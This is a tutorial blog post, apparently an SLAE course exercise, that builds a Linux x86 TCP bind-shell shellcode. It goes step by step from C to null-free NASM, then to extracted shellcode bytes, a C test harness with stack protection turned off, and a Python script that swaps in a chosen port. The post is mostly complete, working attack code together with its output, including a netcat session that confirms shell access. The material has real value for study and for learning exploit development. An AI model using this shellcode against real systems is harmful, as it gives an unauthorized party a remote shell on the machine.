---
layout: post
title: SLAE 1 - Shell Bind TCP Shellcode
date:   2019-02-25
categories: [SLAE, Assembly]
---
The proper steps for a Bind Shell are as follows:
1. [C - Creating the socket](#creating-the-socket)
2. [C - Bind the socket to an IP and port](#bind-the-socket-to-an-ip-and-port)
3. [C - Set the socket to listen](#set-the-socket-to-listen)
4. [C - Accept a connection](#accept-a-connection)
5. [C - Redirect output](#redirect-output)
6. [C - Execute a shell](#execute-a-shell)


In order to easily translate the calls in to assembly, lets build the Bind Shell in C first.  Then we will be able to translate it from there.

## Creating a Bind Shell in C

### Creating the socket
man socket gives details about the call to socket:
```c
int socket(int domain, int type, int protocol);
```
The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>

We will need IPv4 for our domain
> AF_INET             IPv4 Internet protocols

To identify what we need to represent this family, we can look in:
```c 
cat /usr/include/i386-linux-gnu/bits/socket.h | grep _INET

#define PF_INET	2	/* IP protocol family. */
```

The next argument is type, which specifies the communication semantics.  We will be using:
> SOCK_STREAM

In order to see what int we will provide for the argument we can look in:
```c
cat /usr/src/linux-headers-4.15.0-43/include/linux/net.h | grep SOCK_STREAN

* @SOCK_STREAM: stream (connection) socket
  SOCK_STREAM = 1
```
The last argument is protocol, we can pass a 0 in to this argument.

As of right now our call will be:
```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
// using the integers, it is:
socket(2, 1, 0);
```
### Bind the socket to an IP and port
After the socket is created, we will need to call bind to bind the socket to a port.

```c
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
The first argument will be sockfd which comes from the socket we just created above.
The addr parameter will need the sockaddr_in struct, which will include address, port number, and family (AF_INET which was selected earlier for the socket)
```c
struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
```
The code to create this is as follows:
```c
struct sockaddr_in sock_addr;

sock_addr.sin_family = AF_INET;
sock_addr.sin_port = htons(4444);
sock_addr.sin_addr.s_addr = INADDR_ANY;

bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
```
Converting these values from their constants - 
We know AF_INET is 2.
INADDR_ANY is 0x00000000 (0.0.0.0) and can be found here:
```c
cat /usr/include/netinet/net.h | grep INADDR_ANY

#define INADDR_ANY ((in_addr_t) 0x00000000)
```
### Set the socket to listen
The next step is to call the listen function to begin listening on the bound socket.
```c
int listen(int sockfd, int backlog);
```
This is pretty straight forward.  Our sockfd parameter is what we made in step1 and backlog will be 0.

Our call is:
```c
listen(sockfd, 0);
```
### Accept a connection
Now that our socket is listening, we can start the process to accept a connection attempt.
```c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
This is also fairly straight forward.  We can use our socket created in step 1 for the first parameter, and just put NULL for the last 2. 
Note that this function's return value is important to us here.  We will need the return value in order to keep track of the client connection's file descriptor:
> On success, these system calls return a nonnegative integer that is a file descriptor for the accepted socket.

So our call becomes:
```c
int client_socket = accept(sockfd, NULL, NULL);
```
### Redirect output
In order to get input and send output, we need to redirect stdin, stdout, and stderr to the socket using dup2.
```c
int dup2(int oldfd, int newfd);
```
oldfd will be the client_socket that we accepted and newfd will refer to the integers that represet stdin (0), stdout (1), stderr (2).

Our code will be:
```c
dup2(client_socket, 0);
dup2(client_socket, 1);
dup2(client_socket, 2);
```

### Execute a shell
Now that everything is set up, we just need to execute the shell using execve:
```c
execve("/bin/sh", NULL, NULL);
```
### Putting it all together
```c
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in sock_addr;

    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(4444);
    sock_addr.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
    
    listen(sockfd, 0);
    
    int client_socket = accept(sockfd, NULL, NULL);
    
    dup2(client_socket, 0);
    dup2(client_socket, 1);
    dup2(client_socket, 2);
    
    execve("/bin/sh", NULL, NULL);
}
```

## Translating to Assembly

The steps are the same as above:
1. [nasm - Creating the socket](#1-creating-the-socket)
2. [nasm - Bind the socket to an IP and port](#2-bind-the-socket-to-an-ip-and-port)
3. [nasm - Set the socket to listen](#3-set-the-socket-to-listen)
4. [nasm - Accept a connection](#4-accept-a-connection)
5. [nasm - Redirect output](#5-redirect-output)
6. [nasm - Execute a shell](#6-execute-a-shell)
7. [nasm - Putting it all together](#7-putting-it-all-together)

A quick reminder of arguments and calls for assembly:
- EAX is used for the syscall number. As with a lot of calls, EAX will store the return value.
  * Syscall numbers can be found in /usr/include/i386-linux-gnu/asm/unistd_32.h
- EBX is used for the first argument to be passed
- ECX is used for the second argument to be passed
- EDX is used for the third argument to be passed
- ESI is used for the fourth argument to be passed
- EDI is used for the fifth argument to be passed
- Any structs can be made by using the stack and pointing to it's address

### 1 Creating the socket

Sockets are handled through socketcall()\
http://man7.org/linux/man-pages/man2/socketcall.2.html
```c
int socketcall(int call, unsigned long *args);
```
The call ids can be found at:
```c 
cat /usr/include/linux/net.h | grep SYS_

#define SYS_SOCKET	 1		/* sys_socket(2)		*/
#define SYS_BIND	   2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	 4		/* sys_listen(2)		*/
#define SYS_ACCEPT	 5		/* sys_accept(2)		*/
``` 
Looking at our C code, we need to call socket(2, 1, 0);\
This will translate to:\
    EAX - 0x66 for socketcall\
    EBX - 1 fo socket\
    ECX - address on stack with args 2, 1 0\
```asm
; clear registers while avoiding nulls
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; 0x66 for socketcall
mov al, 0x66
;0x1 for socket
mov bl, 0x1
```
Setting up ECX - our *args parameter - we can use the stack to push the values then make ecx the stack pointer so that we have the address for the args.  Note that when using the stack for args in this way, we have to push them in the reverse order due to the way the stack works (FILO).
```asm
; ecx = 0
push ecx
; ebx = 1
push ebx
push 0x2

; point ecx to the stack for args
mov ecx, esp
int 0x80
```
Return value will be sockfd stored in EAX.  Since EAX is used for our socketcall argument, we need to move it to a register for safe keeping which will be edi.
```asm
mov edi, eax
```
### 2 Bind the socket to an IP and port
Now that we have the sockfd, it's time to bind the socket.\
\
As we created earlier, our reference is:\
bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));\
Just for my own understanding, I'll write out the socketcall format with any structs or objects in {}.\
socketcall( SYS_BIND, {sockfd, {AF_INET, 4444, INADDR_ANY}, 0x10} );\
EAX - 0x66\
EBX - 0x2\
ECX - pointing to stack:\
STACK: edi, point to struct, 0x10, struct{0x2, 0x115C, 0x00000000}\
\
Lets build this in assembly now:
```asm
mov al, 0x66
inc ebx      ; previously set to 0x1 -> increase it to 2

; push struct to stack
push edx       ; INADDR_ANY = 0x0
push 0x5C11    ; port: htons(4444) - 0x5C11
push bx        ; AF_INET = 2

;store reference to struct
mov ecx, esp

; push bind args
push 0x10      ; sizeof(sock_addr) = 0x10
push ecx       ; struct sock_addr
push edi       ; sockfd

mov ecx, esp
int 0x80
```
### 3 Set the socket to listen
Next step is to call listen(sockfd, 0);\
This will translate to:
EAX - 0x66\
EBX - 0x4\
ECX - pointing to stack:\
STACK: edi, 0x0\
\
Note that on success, bind returns 0x0 into eax which we can now use for our args on the stack as well as sockfd.
```asm
; stack setup
push eax
push edi

; *args
mov ecx, esp

; set up syscall and listen
mov al, 0x66
inc ebx
inc ebx
int 0x80
```
### 4 Accept a connection
Next step is to call accept(sockfd, NULL, NULL);
This translates to:\
EAX - 0x66\
EBX - 0x5\
ECX - pointing to stack:\
STACK: edi, 0x0, 0x0\
\
Note that on success, listen returns 0x0 into eax (same as above).
```asm
; stack setup
push eax
push eax
push edi

; *args
mov ecx, esp

; set up syscall and accept
mov al, 0x66
inc ebx
int 0x80
```
### 5 Redirect output
Now that we have accepted the connection, we need to redirect in, out, & err.
The return value for accept is the descriptor for the client connection, which will be used as an argument for dup2 in ebx.  We can just move this from eax to ebx first.\
dup2(client_socket, 0);\
dup2(client_socket, 1);\
dup2(client_socket, 2);\
This translates to:\
EAX - 0x3f\
EBX - return value from accept\
ECX - integer 2, 1, or 0
Since this is the same call 3 times and the only difference is an increasing (*hint* or decreasing) int.. this looks like a loop would be best to use here.\
Luckily, our loop only needs to decrease from 2.  ECX can be used as the counter AND the argument, which helps us out a lot here.

Grab the syscall number for dup2:
```c
cat /usr/
```
There is a conditional jump in assembly called jns which means, as I understand it, "Jump No Sign".  Which will take the jump until the Sign Flag is set.  Easier description.. Take the jump until the value becomes negative.\
This conditional jump is perfect for us because it will include 0 in our loop before exiting.
```asm
        mov ebx, eax    ; client_socket arg
        xor ecx, ecx    ; zero ecx avoiding nulls
        mov cl, 0x2     ; setup counter
dup:
        mov al, 0x3f
        int 0x80        ; dup2(client_socket, [ecx])
        dec ecx
        jns dup
```
### 6 Execute a shell
Now we just need to execute /bin/sh with execve to give the client the shell.\
The call will be:\
execve("/bin/sh", NULL, NULL);\
We have to null terminate the string for "/bin/sh" so we will use the stack to assign it to the proper register.\
EDX is still 0'd out so we can keep it the same and also use it to make ECX 0.
Note that, for ease of writing, we want 8 characters for our string.  We can do "/bin//sh" to effectively give the same command and have the proper length.  We also want to reverse the string, split it in to 4 character sections and push it on to the stack in hex.
```asm
push edx  ; null terminate the string
push 0x68732f2f ; push hs//
push 0x6e69622f ; push nib/

mov ebx, esp    ; move null terminated string into register

mov ecx, edx    ; 0x0
mov al, 0xB     ; syscall execve
int0x80         ; execve("/bin/sh", NULL, NULL);
```
### 7 Putting It All Together
The final product is:
```asm
global _start

section .text

_start:
        ; clear registers while avoiding nulls
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
        
        
        ;***************;
        ; create socket ;
        ;***************;
        
        
        ; 0x66 for socketcall
        mov al, 0x66
        ; callid - socket
        mov bl, 0x1
        
        push ecx
        push ebx
        push 0x2
        
        mov ecx, esp
        int 0x80
        
        ; store sockfd for later
        mov edi, eax
        
        
        ;*************;
        ; bind socket ;
        ;*************;
        
        
        ; syscall - socketcall
        mov al, 0x66
        
        ; callid - bind (increase ebx from 1 to 2)
        inc ebx
        
        ; create struct {AF_INET, 444, INADDR_ANY}
        push edx            ; INADDR_ANY = 0x0
        push 0x5C11         ; Port 4444 htons(4444)
        push bx             ; AF_INET = 0x2
        mov ecx, esp        ; store pointer to struct
        
        ; create args for bind {sockfd, struct, sizeof(struct)}
        push 0x10           ; struct size = 0x10
        push ecx            ; pointer to struct
        push edi            ; sockfd stored from socket call
        
        mov ecx, esp
        int 0x80            ; bind(sockfd, sock_addr, sizeof(sock_addr))
        
        
        ;**********************;
        ; set socket to listen ;
        ;**********************;
        
        
        ; registers are prepared for args, so lets push before changing anything
        push eax            ; 0x0
        push edi            ; sockfd
        
        mov ecx, esp
        
        ; syscall - socketcall
        mov al, 0x66
        
        ; callid - listen (0x4)
        inc ebx
        inc ebx
        int 0x80            ; listen(sockfd, 0)
        
        
        ;*******************;
        ; accept connection ;
        ;*******************;
        
        
        ; eax is 0 from the return value of listen
        push eax            ; NULL
        push eax            ; NULL
        push edi            ; sockfd
        mov ecx, esp
        
        ; syscall - socketcall
        mov al, 0x66
        
        ; callid - accept
        inc ebx
        int 0x80            ; accept(sockfd, NULL, NULL);
        
        
        ;*****************;
        ; redirect output ;
        ;*****************;
        
        
        mov ebx, eax        ; client_socket used for arg
        xor ecx, ecx        
        mov cl, 0x2         ; prepare counter
dup:
        ; syscall - dup2 (0x3f)
        mov al, 0x3f
        int 0x80            ; dup2(client_socket, x)
        dec ecx
        jns dup             ; jump if positive, don't if negative
        
        
        ;***************;
        ; execute shell ;
        ;***************;
        
        
        push edx            ; 0x0
        push 0x68732f2f     ; push hs//
        push 0x6e69622f     ; push nib/
        
        mov ebx, esp        ; null terminated /bin//sh
        mov ecx, edx        ; 0x0
        mov al, 0xB
        int 0x80            ; execve("/bin//sh", NULL, NULL)
```
Compile it:
> nasm -f elf32 -o bind_shell.o bind_shell.nasm\
> ld -z execstack -o bind_shell bind_shell.o

Let's check this for null bytes:
```
objdump -d bind_shell -M intel
bind_shell:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	31 db                	xor    ebx,ebx
 8048084:	31 c9                	xor    ecx,ecx
 8048086:	31 d2                	xor    edx,edx
 8048088:	b0 66                	mov    al,0x66
 804808a:	b3 01                	mov    bl,0x1
 804808c:	51                   	push   ecx
 804808d:	53                   	push   ebx
 804808e:	6a 02                	push   0x2
 8048090:	89 e1                	mov    ecx,esp
 8048092:	cd 80                	int    0x80
 8048094:	89 c7                	mov    edi,eax
 8048096:	b0 66                	mov    al,0x66
 8048098:	43                   	inc    ebx
 8048099:	52                   	push   edx
 804809a:	66 68 11 5c          	pushw  0x5c11
 804809e:	66 53                	push   bx
 80480a0:	89 e1                	mov    ecx,esp
 80480a2:	6a 10                	push   0x10
 80480a4:	51                   	push   ecx
 80480a5:	57                   	push   edi
 80480a6:	89 e1                	mov    ecx,esp
 80480a8:	cd 80                	int    0x80
 80480aa:	50                   	push   eax
 80480ab:	57                   	push   edi
 80480ac:	89 e1                	mov    ecx,esp
 80480ae:	b0 66                	mov    al,0x66
 80480b0:	43                   	inc    ebx
 80480b1:	43                   	inc    ebx
 80480b2:	cd 80                	int    0x80
 80480b4:	50                   	push   eax
 80480b5:	50                   	push   eax
 80480b6:	57                   	push   edi
 80480b7:	89 e1                	mov    ecx,esp
 80480b9:	b0 66                	mov    al,0x66
 80480bb:	43                   	inc    ebx
 80480bc:	cd 80                	int    0x80
 80480be:	89 c3                	mov    ebx,eax
 80480c0:	31 c9                	xor    ecx,ecx
 80480c2:	b1 02                	mov    cl,0x2

080480c4 <dup>:
 80480c4:	b0 3f                	mov    al,0x3f
 80480c6:	cd 80                	int    0x80
 80480c8:	49                   	dec    ecx
 80480c9:	79 f9                	jns    80480c4 <dup>
 80480cb:	52                   	push   edx
 80480cc:	68 2f 2f 73 68       	push   0x68732f2f
 80480d1:	68 2f 62 69 6e       	push   0x6e69622f
 80480d6:	89 e3                	mov    ebx,esp
 80480d8:	89 d1                	mov    ecx,edx
 80480da:	b0 0b                	mov    al,0xb
 80480dc:	cd 80                	int    0x80
```
NOTE: Originally.. at 0x804809a: "pushw 0x5c11" there WAS two null bytes my first check for this.  It seems I forgot to specify "push word". I ended up going back, fixing it, verifying, and extract bytes to test.

Now, let's extract the bytes to test out the shellcode.
```
objdump -d ./bind_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x50\x57\x89\xe1\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\xb0\x66\x43\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"
```
Our shellcode wrapper, with our shellcode included, is:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x50\x57\x89\xe1\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\xb0\x66\x43\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Compile.:
```shell
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```
Now it should work!\
Run the file:
```shell
./shellcode
Shellcode Length:  94
```
Connect and issue a command:
```shell
nc -v 127.0.0.1 4444
Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
who
pwoer    tty7         Dec 11 10:13 (:0)
```
It works!

Now we have to make the port adjustable.  In order to do that we'll just write a python script that replaces the port in the shellcode with whatever the user inputs and then outputs the new shellcode.
```python
import struct
import sys

def main():
	if len(sys.argv) != 2:
		print "Usage: {0} PORT".format(sys.argv[0])
		exit()

	port = int(sys.argv[1])
	print port	
	# bounds checking
	if not (0 <= port <= 65535):
		print "That's not a real port number!"
		exit()

	# check well known ports
	if port <= 1024:
		print "Reminder: Well known port needs to be run as root"

	port = r'\x' + r'\x'.join(x.encode('hex') for x in struct.pack('!H', port))	

	# check nulls
	if r'\x00' in port:
		print 'Null in that port number. Try again.'
		exit()

	shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x43\\x52\\x66\\x68" + port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x50\\x57\\x89\\xe1\\xb0\\x66\\x43\\x43\\xcd\\x80\\x50\\x50\\x57\\x89\\xe1\\xb0\\x66\\x43\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"

	print "Shellcode: " + shellcode
	
if __name__=="__main__":
	main()
```
This successfuly outputs the new shellcode with the desired port!
